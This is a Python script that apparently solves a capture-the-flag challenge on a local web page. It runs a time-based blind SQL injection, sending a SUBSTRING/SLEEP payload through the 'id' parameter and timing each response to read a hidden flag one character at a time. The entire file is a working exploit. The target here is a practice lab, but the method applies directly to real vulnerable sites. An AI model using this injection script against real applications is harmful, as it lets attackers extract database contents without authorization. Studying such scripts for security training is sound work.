import requests
import time

# Challenge URL
URL = "http://localhost:8082/challenge.php"
# The session cookie after you enter the Easy flag
# Copy this from your Burp Suite 'Cookie' header
COOKIES = {"PHPSESSID": "d623e9d2d4ef4e7d842fc01fb9008f2c"}

def solve():
    flag = ""
    print("[+] Starting extraction...")
   
    # We loop through character positions (1 to 50)
    for i in range(1, 50):
        # We loop through printable characters
        for char_code in range(32, 127):
            char = chr(char_code)
            
            # This payload asks: "Is the character at position 'i' equal to 'char'?"
            # If yes, sleep for 2 seconds.
            payload = f"1' AND (SELECT IF(SUBSTRING((SELECT flag_part FROM members_hidden LIMIT 1),{i},1)='{char}',SLEEP(2),0))-- -"
            
            start_time = time.time()
            try:
                requests.get(URL, params={'id': payload}, cookies=COOKIES)
            except Exception as e:
                print(f"\n[!] Error: {e}")
                return

            elapsed = time.time() - start_time
            
            # If the response took more than 2 seconds, we found the character
            if elapsed >= 2:
                flag += char
                print(f"[+] Found character {i}: {char}  -> Current Flag: {flag}")
                if char == "}":
                    print(f"\n[!] Full Flag Found: {flag}")
                    return
                break
        else:
            # If we finish the character loop without a hit, we are done
            break

if __name__ == "__main__":
    solve()
